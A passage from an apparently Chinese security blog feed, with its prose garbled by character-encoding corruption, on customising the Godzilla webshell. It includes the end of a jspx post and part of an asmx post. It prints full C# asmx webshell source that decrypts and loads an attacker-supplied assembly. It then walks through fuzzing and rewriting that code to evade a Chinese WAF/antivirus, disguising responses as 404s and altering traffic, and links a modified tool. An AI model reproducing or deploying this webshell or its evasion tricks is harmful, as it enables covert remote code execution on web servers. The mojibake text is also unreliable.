src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250207104054740.png" alt="image-20250207104054740"></p><p>è¿™æ ·å°±è¿‡æ‰dç›¾äº†ã€‚æ¥ä¸‹æ¥å†å°†å…¶ä»–çš„ç»†èŠ‚ä¼˜åŒ–ä¸€ä¸‹ã€‚æ²¡ç”¨çš„ç©ºæ ¼ï¼Œå­—ç¬¦ä¸²å»æ‰å³å¯ã€‚</p><p>å¥½çš„ï¼Œç”¨ä¸€ç‚¹æ—¶é—´ï¼ŒæŠŠæœ¨é©¬æ”¾åˆ°æ¨¡æ¿é‡Œã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208113713958.png" alt="image-20250208113713958"></p><p> ç¼–è¯‘æ‰“åŒ…ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208141334288.png" alt="image-20250208141334288"></p><p>å¤§å®¶è®°å¾—ä½¿ç”¨çš„æ—¶å€™é€‰è¿™ä¸ªjspxçš„</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208141556870.png" alt="image-20250208141556870"></p><p>é€‰æ‹©jspxçš„ã€‚ç…§ä¾‹ç”Ÿæˆä¸‰ä¸ª</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208142322997.png" alt="image-20250208142322997"></p><p>ä¼ ä¸Šå»  è®¿é—®ä¸€ä¸‹</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208143608371.png" alt="image-20250208143608371"></p><p>è¿™é‡Œç¬”è€…ä¹Ÿåšäº†404çš„ğŸï¼Œè¿™ä¸ª404æ˜¾ç¤ºæ­£å¸¸çš„ï¼Œæ–‡ä»¶å­˜åœ¨çš„ã€‚</p><p>ç«ç‹</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208143805781.png" alt="image-20250208143805781"></p><p>tomcat å¦‚æœä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œè¿”å›åº”è¯¥æ˜¯ä¸‹é¢è¿™æ ·çš„</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208143647148.png" alt="image-20250208143647148"></p><p>å¤§å®¶è¿æ¥çš„æ—¶å€™é€‰æ‹©<code>JAVA_AES_BASE64_DATA_JSPX</code></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208143927656.png" alt="image-20250208143927656"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208144131065.png" alt="image-20250208144131065"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208144107065.png" alt="image-20250208144107065"></p><p>çœ‹ä¸‹æµé‡ï¼Œä¹Ÿæ²¡å•¥é—®é¢˜ï¼Œè¿”å›ç æ˜¯404ã€‚<code>LF/IpkPvM0iJI4wmpBs2DaoBVvcbDMpwuL7nYS3n/k4=</code></p><p>å¤§å®¶çœ‹åˆ°è¿™ä¸ªæ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œè¿™ä¸ªæ˜¯å¤§å®¶ç”¨äº†é»˜è®¤keyåŠ å¯†å¾—æ¥çš„testç»“æœã€‚å¾ˆå®¹æ˜“è¢«è¯†åˆ«ã€‚å»ºè®®å¤§å®¶åœ¨ä½¿ç”¨çš„æ—¶å€™åƒä¸‡ä¸è¦ä½¿ç”¨é»˜è®¤passå’Œkeyã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208144345015.png" alt="image-20250208144345015"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208144354634.png" alt="image-20250208144354634"></p><p>å¥½ï¼Œåœ¨çœ‹ä¸€ä¸‹å¾®æ­¥ï¼Œä¹Ÿæ²¡å•¥é—®é¢˜ã€‚å…¶ä»–çš„å°±ä¸æµ‹äº†ã€‚è¿™æ ·jspxçš„ä¹Ÿæ”¹å®Œäº†ã€‚</p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>æœ¬æ–‡å¯¹godzillaä¸­jspxæœ¨é©¬è¿›è¡Œå…æ€ï¼ŒåŠæµé‡ä¿®æ”¹è¿›è¡Œç®€å•å…æ€ï¼Œå°†å…æ€æœ¨é©¬å°è£…åˆ°godzillaä¸­ï¼Œä½¿ç”¨æ¨¡æ¿è¿›è¡Œå…æ€ï¼Œè¾¾åˆ°æ¯æ¬¡ç”Ÿæˆçš„æœ¨é©¬éƒ½ä¸ç›¸åŒã€‚</p><h5 id="ä¸‹ä¸ªç‰ˆæœ¬"><a href="#ä¸‹ä¸ªç‰ˆæœ¬" class="headerlink" title="ä¸‹ä¸ªç‰ˆæœ¬"></a>ä¸‹ä¸ªç‰ˆæœ¬</h5><p>1.1ç‰ˆæœ¬æ·»åŠ æœ¨é©¬çš„å…æ€ï¼Œå…¨è¯­è¨€éƒ½åšå¥½äº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ”¹æµé‡ä»¥åŠåŠ å¯†æ–¹å¼ï¼Œåªæ˜¯åšäº†ä¼ªè£…ã€‚</p><p>1.2ç‰ˆæœ¬åšäº†åŠ¨æ€å¯†é’¥ã€‚</p><p>1.3ç‰ˆæœ¬åšäº†å·¦å³åŠ¨æ€æ·»åŠ æ•°æ®ï¼Œ</p><p>1.4ç‰ˆæœ¬åšäº†asmxåŠ¨æ€å…æ€åŠæµé‡ä¿®æ”¹ã€‚</p><p>1.5ç‰ˆæœ¬åšäº†jspxåŠ¨æ€å…æ€åŠæµé‡ä¿®æ”¹ã€‚</p><p>åé¢éœ€è¦åšçš„ï¼šä¿®æ”¹ä¸€ä¸‹åŠ å¯†æ–¹å¼ï¼Œè¿™æ ·çš„è¯ä¼šæ›´å¥½ä¸€ç‚¹ã€‚è¿˜æœ‰å°±æ˜¯dataå…¶å®æ˜¯å›ºå®šçš„ï¼Œå¸Œæœ›èƒ½è®©ä»–åŠ¨èµ·æ¥ã€‚</p><h5 id="ä¸‹è½½ã€ä½¿ç”¨"><a href="#ä¸‹è½½ã€ä½¿ç”¨" class="headerlink" title="ä¸‹è½½ã€ä½¿ç”¨"></a>ä¸‹è½½ã€ä½¿ç”¨</h5><p>ä»€ä¹ˆï¼Œä½ è¯´çœ‹ä¸æ˜ç™½ã€ä¸æƒ³åŠ¨æ‰‹ã€å¤ªéº»çƒ¦ï¼Œæ²¡äº‹ï¼Œå»ä¸‹è½½å°±å¯ä»¥äº†ã€‚<br><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p><h5 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h5><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚</p><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            åŸç‰ˆå“¥æ–¯æ‹‰</span><br><span class="line">https://zone.huoxian.cn/d/1229-jspwebshell  JSPwebshellå…æ€ä¸€äº›æŠ€å·§</span><br><span class="line">https://yzddmr6.com/posts/jsp-webshell-upload-bypass/ æ˜Ÿçƒé—®ç­”ï¼šä¸€æ¬¡jspä¸Šä¼ ç»•è¿‡çš„æ€è€ƒ</span><br></pre></td></tr></table></figure><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> godzilla </tag>
            
            <tag> äºŒå¼€ </tag>
            
            <tag> jspxå…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å“¥æ–¯æ‹‰äºŒå¼€ä»0åˆ°1-5(asmxå…æ€)</title>
      <link href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/"/>
      <url>/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/</url>
      
        <content type="html"><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><p>ä¸Šé¢çš„æ–‡ç« åšäº†åŠ¨æ€çš„å…æ€ï¼Œä»¥åŠåŸºäºæ—¶é—´çš„å¯†é’¥åŠ¨æ€å¤„ç†ï¼Œè®¡åˆ’ä¸­åšä¸€ä¸‹å…¶ä»–è¯­è¨€çš„å…æ€åŠæµé‡ä¿®æ”¹ï¼Œæœ¬ç¯‡æ–‡ç« åšä¸€ä¸‹asmxæµé‡ä¿®æ”¹åŠå…æ€ã€‚</p><h5 id="asmxç®€ä»‹"><a href="#asmxç®€ä»‹" class="headerlink" title="asmxç®€ä»‹"></a>asmxç®€ä»‹</h5><p><code>ASMX</code> æ–‡ä»¶æ˜¯ä¸€ä¸ªç”¨äºåœ¨ ASP.NET Web æœåŠ¡ä¸­å®šä¹‰å’Œå¤„ç†è¯·æ±‚çš„æ–‡ä»¶æ ¼å¼ã€‚å®ƒé€šå¸¸ç”¨äºåˆ›å»ºåŸºäº XML çš„ Web æœåŠ¡ï¼Œå…è®¸å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨è¿›è¡Œè¿œç¨‹äº¤äº’ï¼Œä¼ è¾“æ•°æ®å¹¶æ‰§è¡Œæ–¹æ³•ã€‚ASMX æ–‡ä»¶é€šå¸¸åŒ…å«æœåŠ¡çš„ä»£ç å’Œå®šä¹‰ï¼Œç”¨æ¥å¤„ç† Web æœåŠ¡çš„è¯·æ±‚å’Œå“åº”ã€‚</p><p>Web æœåŠ¡ï¼ˆä¹Ÿå«åš XML Web Serviceï¼‰æ˜¯ä¸€ç§èƒ½å¤Ÿæ¥æ”¶æ¥è‡ªäº’è”ç½‘æˆ–å±€åŸŸç½‘ä¸­å…¶ä»–ç³»ç»Ÿçš„è¯·æ±‚ï¼Œæä¾›è½»é‡çº§é€šä¿¡çš„ç‹¬ç«‹æŠ€æœ¯ã€‚Web æœåŠ¡é€šè¿‡ SOAP åè®®åœ¨ Web ä¸Šæä¾›åŠŸèƒ½ï¼Œé€šå¸¸ç”± WSDL æ–‡ä»¶æè¿°ï¼Œå¹¶é€šè¿‡ UDDI æ³¨å†Œã€‚</p><ol><li><strong>SOAP</strong>ï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰ï¼šå®ƒæ˜¯ XML Web æœåŠ¡çš„é€šä¿¡åè®®ï¼Œå®šä¹‰äº†å¦‚ä½•é€šè¿‡ HTTP æˆ–å…¶ä»–åº•å±‚åè®®æ¥è°ƒç”¨ Web æœåŠ¡ä¸­çš„æ–¹æ³•ã€‚SOAP ä½¿ç”¨ XML æ ¼å¼çš„æ¶ˆæ¯è¿›è¡Œé€šä¿¡ã€‚</li><li><strong>WSDL</strong>ï¼ˆWeb æœåŠ¡æè¿°è¯­è¨€ï¼‰ï¼šä¸€ä¸ª XML æ–‡æ¡£ï¼Œç”¨äºæè¿° Web æœåŠ¡çš„æ“ä½œä»¥åŠå¦‚ä½•äº¤æ¢æ•°æ®ã€‚WSDL æ–‡ä»¶é€šå¸¸ç”±è½¯ä»¶è‡ªåŠ¨ç”Ÿæˆï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ UDDI è¿›è¡Œæ³¨å†Œã€‚</li><li><strong>UDDI</strong>ï¼ˆç»Ÿä¸€æè¿°ã€å‘ç°ä¸é›†æˆï¼‰ï¼šä¸€ç§æ ‡å‡†çš„ Web æœåŠ¡ç›®å½•ï¼Œå…è®¸ Web æœåŠ¡æ³¨å†Œå¹¶è¢«å…¶ä»–ç³»ç»Ÿå‘ç°ã€‚</li></ol><p>.asmxæ˜¯webserviceæœåŠ¡ç¨‹åºçš„åç¼€åï¼ŒASP.NET ä½¿ç”¨.asmx æ–‡ä»¶æ¥å¯¹Web Servicesçš„æ”¯æŒã€‚.asmx æ–‡ä»¶å’Œ.aspxæ–‡ä»¶ä¸€æ ·éƒ½å±äºæ–‡æœ¬æ–‡ä»¶ã€‚å®ƒåŒ…å«åœ¨.aspxæ–‡ä»¶ä¹‹ä¸­ï¼Œæˆä¸ºASP.NETåº”ç”¨ç¨‹åºçš„ä¸€éƒ¨åˆ†ã€‚</p><p>å…·æœ‰ .asmx æ‰©å±•åçš„æ–‡ä»¶æ˜¯ä¸€ç§ ASP.NET Web æœåŠ¡æ–‡ä»¶ï¼Œå®ƒä½¿ç”¨ç®€å•å¯¹è±¡è®¿é—®åè®® (SOAP) åœ¨ Internet ä¸Šæä¾›ä¸¤ä¸ªå¯¹è±¡ä¹‹é—´çš„é€šä¿¡ã€‚å®ƒä½œä¸ºæœåŠ¡éƒ¨ç½²åœ¨åŸºäº Windows çš„ Web æœåŠ¡å™¨ä¸Šï¼Œç”¨äºå¤„ç†ä¼ å…¥è¯·æ±‚å¹¶è¿”å›å“åº”ã€‚ä¸åŒ…å« ASP.NET ç½‘é¡µå¯è§†åŒ–æ˜¾ç¤ºä»£ç çš„ASPXæ–‡ä»¶ä¸åŒï¼ŒASMX æ–‡ä»¶åœ¨åå°è¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šï¼Œå¹¶æ‰§è¡Œä¸åŒçš„ä»»åŠ¡ï¼Œä¾‹å¦‚è¿æ¥æ•°æ®åº“ã€æ£€ç´¢æ•°æ®å’Œè¿”å›æ•°æ®æå‡ºè¯·æ±‚çš„æ ¼å¼ã€‚è¿™äº›ä¸“é—¨ç”¨äº XML Web æœåŠ¡ã€‚</p><p>è¯´é‚£ä¹ˆå¤šï¼Œä¸å¦‚ä¸€è§ï¼Œæˆ‘ä»¬åœ¨æ‰“æˆ˜çš„æ—¶å€™ç»å¸¸ä¼šè§åˆ°è¿™ç§é¡µé¢ï¼Œé‚£ä¹ˆè¿™ç§ä¹Ÿé¡µé¢å°±æ˜¯é‡‡ç”¨çš„è¿™ç§å½¢å¼ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250124180239062.png" alt="image-20250124180239062"></p><p>æ¥çœ‹ä¸€ä¸‹ä¼ å‚æ–¹å¼ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªè®¡ç®—å™¨ï¼Œæœ‰å››ç§æ–¹æ³•ï¼ŒåŠ å‡ä¹˜é™¤ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126164320685.png" alt="image-20250126164320685"></p><p>è¿™é‡Œé€‰æ‹©åŠ ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªå‚æ•°numï¼Œé‡‡ç”¨xmlçš„ä¼ å‚æ–¹å¼</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/aspx/time/calc.asmx</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.205</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>length</span><br><span class="line"><span class="attribute">SOAPAction</span><span class="punctuation">: </span>&quot;http://tempuri.org/Add&quot;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:soap</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">Add</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://tempuri.org/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">num1</span>&gt;</span>double<span class="tag">&lt;/<span class="name">num1</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">num2</span>&gt;</span>double<span class="tag">&lt;/<span class="name">num2</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">Add</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126164744661.png" alt="image-20250126164744661"></p><p>è¿™é‡Œç»è¿‡ç¬”è€…æµ‹è¯•ï¼Œè¿™ä¸ª<code>SOAPAction: &quot;http://tempuri.org/Add&quot;</code>ç»è¿‡æµ‹è¯•æ˜¯å¯ä»¥å»æ‰çš„ã€‚ä¸å†™è¿™ä¸€å¥ä¹Ÿæ²¡é—®é¢˜ã€‚ä»¥ä¸‹å’±ä»¬å°±ç»™ä»–å»æ‰å¥½äº†ï¼Œå°‘ä¸€å¥è¯ï¼Œå°±å°‘ä¸€ä¸ªç‰¹å¾ï¼Œå®å¯ä¿¡å…¶æœ‰ï¼Œä¸å¯ä»¥ä¿¡å…¶æ— ã€‚å¥½ï¼Œæœ¬ç¼–ä¸»è¦çœ‹çš„æ˜¯asmxå…æ€è¿™é‡Œå°±ç®€å•è®²ä¸€ä¸‹æ ¼å¼ï¼Œä¸€ä¼šè¿˜ä¼šçœ‹åˆ°ã€‚</p><h5 id="asmxå…æ€"><a href="#asmxå…æ€" class="headerlink" title="asmxå…æ€"></a>asmxå…æ€</h5><p>å…ˆç®€å•æ¥çœ‹ä¸€ä¸‹å“¥æ–¯æ‹‰åŸç‰ˆasmxæœ¨é©¬ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ WebService Language=&quot;C#&quot; Class=&quot;WebService1&quot; %&gt;</span><br><span class="line">public class WebService1 : System.Web.Services.WebService</span><br><span class="line">&#123;</span><br><span class="line">    [System.Web.Services.WebMethod(EnableSession = true)]</span><br><span class="line">    public string asd(string asd)</span><br><span class="line">    &#123;</span><br><span class="line">        System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            string key = &quot;544e864796f05937&quot;;</span><br><span class="line">            string bohemian_pass = &quot;asd&quot;;</span><br><span class="line">            string md5 = System.BitConverter.ToString(</span><br><span class="line">                new System.Security.Cryptography.MD5CryptoServiceProvider()</span><br><span class="line">                .ComputeHash(System.Text.Encoding.Default.GetBytes(asd_pass + key))</span><br><span class="line">            ).Replace(&quot;-&quot;, &quot;&quot;);</span><br><span class="line">            byte[] data = System.Convert.FromBase64String(System.Web.HttpUtility.UrlDecode(bohemian));</span><br><span class="line">            data = new System.Security.Cryptography.RijndaelManaged()</span><br><span class="line">                .CreateDecryptor(</span><br><span class="line">                    System.Text.Encoding.Default.GetBytes(key), </span><br><span class="line">                    System.Text.Encoding.Default.GetBytes(key)</span><br><span class="line">                )</span><br><span class="line">                .TransformFinalBlock(data, 0, data.Length);</span><br><span class="line"></span><br><span class="line">            if (Context.Session[&quot;payload&quot;] == null)</span><br><span class="line">            &#123;</span><br><span class="line">                Context.Session[&quot;payload&quot;] = (System.Reflection.Assembly)</span><br><span class="line">                    typeof(System.Reflection.Assembly)</span><br><span class="line">                    .GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;)</span><br><span class="line">                    .Invoke(null, new object[] &#123; data &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                object o = ((System.Reflection.Assembly)Context.Session[&quot;payload&quot;]).CreateInstance(&quot;LY&quot;);</span><br><span class="line">                System.IO.MemoryStream outStream = new System.IO.MemoryStream();</span><br><span class="line">                o.Equals(Context);</span><br><span class="line">                o.Equals(outStream);</span><br><span class="line">                o.Equals(data);</span><br><span class="line">                o.ToString();</span><br><span class="line">                byte[] r = outStream.ToArray();</span><br><span class="line">                stringBuilder.Append(md5.Substring(0, 16));</span><br><span class="line">                stringBuilder.Append(</span><br><span class="line">                    System.Convert.ToBase64String(</span><br><span class="line">                        new System.Security.Cryptography.RijndaelManaged()</span><br><span class="line">                        .CreateEncryptor(</span><br><span class="line">                            System.Text.Encoding.Default.GetBytes(key), </span><br><span class="line">                            System.Text.Encoding.Default.GetBytes(key)</span><br><span class="line">                        )</span><br><span class="line">                        .TransformFinalBlock(r, 0, r.Length)</span><br><span class="line">                    )</span><br><span class="line">                );</span><br><span class="line">                stringBuilder.Append(md5.Substring(16));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (System.Exception)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        return stringBuilder.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•çœ‹ä¸€ä¸‹ï¼Œå…¶å®å’Œaspxçš„æœ¨é©¬å·®ä¸å¤šçš„ã€‚æ— éæ˜¯ä¸€äº›ç»†èŠ‚ä¸Šä¸ä¸€æ ·ã€‚åŠ è½½æ–¹å¼ã€å‡½æ•°å•¥çš„ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126165948109.png" alt="image-20250126165948109"></p><p>æ”¾åˆ°dç›¾ä¸­ï¼Œ5çº§ã€‚æˆ‘ä»¬è¿›è¡Œä¸€ä¸‹ç®€å•fuzzã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126170127598.png" alt="image-20250126170127598"></p><p>ç›´æ¥åˆ ä¸€èˆ¬ï¼Œçœ‹åˆ°æŠ¥2çº§ï¼Œåº”è¯¥æ˜¯è¿˜æœ‰é—®é¢˜ã€‚</p><p>æ ¹æ®ä»¥å¾€ç»éªŒï¼Œå¤§æ¦‚ç‡æ˜¯åŠ å¯†é—®é¢˜ï¼Œdata = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(</p><p>è¿™å¥ä¸­RijndaelManagedè¿™ä¸ªå‡½æ•°ï¼Œæ˜¯åŠ å¯†ä½¿ç”¨çš„ï¼Œæˆ‘ä»¬ç»™ä»–åˆ æ‰</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126170417879.png" alt="image-20250126170417879"></p><p>è¿™æ ·å°±æ²¡é—®é¢˜äº†ï¼Œé‚£ä¹ˆè¿˜æ˜¯è¦ç”¨çš„ï¼Œç»è¿‡æœç´¢ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>AesManaged()</code>å‡½æ•°ä»£æ›¿</p><p><code>data = new System.Security.Cryptography..CreateDecryptor(changshangsan, changshangsan).TransformFinalBlock(data, 0, data.Length);</code>ä¹Ÿå°±æ˜¯è¯´åƒè¿™æ ·å†™å°±å¯ä»¥äº†ã€‚</p><p>åˆšåˆšåˆ æ‰çš„é‚£ä¸€æ®µæ‹¿å›æ¥ç»§ç»­fuzzä¸€ä¸‹ã€‚</p><p>è¿™é‡Œfuzzåæ˜¯<code> Context.Session[&quot;payload&quot;] = (System.Reflection.Assembly)                     typeof(System.Reflection.Assembly)                     .GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;)                     .Invoke(null, new object[] &#123; data &#125;);</code></p><p>å¯ä»¥çœ‹åˆ°æ˜¯åŠ è½½dataçš„ï¼Œæˆ‘ä»¬è¿›è¡Œæ”¹å†™ä¸€ä¸‹ï¼Œç¬”è€…åœ¨fuzzçš„æ—¶å€™ï¼Œå¤§æ¦‚ç‡æ˜¯loadæˆ–è€…payloadçš„é—®é¢˜ï¼Œè¿˜æœ‰è¿™ä¸ªinvokeï¼Œä¹Ÿæ˜¯å¨èƒçš„ã€‚</p><p><code>            if (Context.Session[&quot;changshangyi&quot;] == null) &#123;     AppDomain currentDomain = AppDomain.CurrentDomain;     byte[] assemblyData = data;     System.IO.MemoryStream assemblyStream = new System.IO.MemoryStream(assemblyData);     System.Reflection.Assembly assembly = currentDomain.Load(assemblyStream.ToArray());     Context.Session[&quot;changshangyi&quot;] = assembly;</code></p><p>å†™çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç»™ä»–æ¢ç§å†™æ³•ï¼ŒæŠŠå…³é”®å­—ç»™ä»–å»æ‰</p><p>dataä¸ºè·å–åˆ°çš„å¾ˆå¤šæ–¹æ³•</p><p><strong><code>system.IO.MemoryStream assemblyStream = new System.IO.MemoryStream(assemblyData);</code></strong></p><ul><li>ä½¿ç”¨å­—èŠ‚æ•°ç»„ <code>assemblyData</code> åˆ›å»ºä¸€ä¸ªå†…å­˜æµå¯¹è±¡ <code>assemblyStream</code>ã€‚</li><li>å†…å­˜æµå…è®¸å­—èŠ‚æ•°ç»„çš„æ“ä½œæ¨¡æ‹Ÿæ–‡ä»¶æµï¼Œæ–¹ä¾¿åç»­å¤„ç†ã€‚</li></ul><p><strong><code>System.Reflection.Assembly assembly = currentDomain.Load(assemblyStream.ToArray());</code></strong></p><ul><li>å°†å†…å­˜æµçš„æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„å¹¶åŠ è½½ä¸ºç¨‹åºé›† (<code>Assembly</code>) å¯¹è±¡ã€‚</li><li><strong><code>currentDomain.Load</code></strong> 